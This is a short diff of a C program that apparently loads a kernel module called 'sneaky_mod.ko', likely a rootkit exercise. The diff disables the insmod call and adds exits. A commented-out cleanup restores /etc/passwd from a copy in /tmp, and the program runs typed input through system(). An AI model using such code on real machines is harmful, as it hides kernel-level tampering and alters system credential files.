@@ -53,7 +53,8 @@ int main(void){
 					printf("TODO: insmod kernel\n");
 					//TODO: verify this is working
 					char *insmod[] = {"insmod", "sneaky_mod.ko", 0};
-					execvp(insmod[0], insmod);
+					//execvp(insmod[0], insmod);
+					exit(0);
 				default:
 					;//LOOP KEY INPUTS HERE AND QUIT WHEN "Q" IS RECEIVED
 					char word[256];
@@ -66,7 +67,6 @@ int main(void){
 							if(strcmp(tmp, "q\n") == 0 || strcmp(tmp, "Q\n") == 0){
 								//printf("Q FOUND Input: %s\n", tmp);
 								printf("TODO: unload kernel and restore passwd file\n");
-								free(tmp);
 								/*
 								int cleanup_pid = fork();
 								switch(cleanup_pid){
@@ -83,6 +83,7 @@ int main(void){
 										char *cp_cmd[] = {"cp", "/tmp/passwd", "/etc/passwd", 0}; //'rm /etc/passwd' cmd
 										execvp(cp_cmd[0], cp_cmd);
 								}*/
+								exit(0);
 							}
 							int ret = system(tmp);
 							free(tmp);
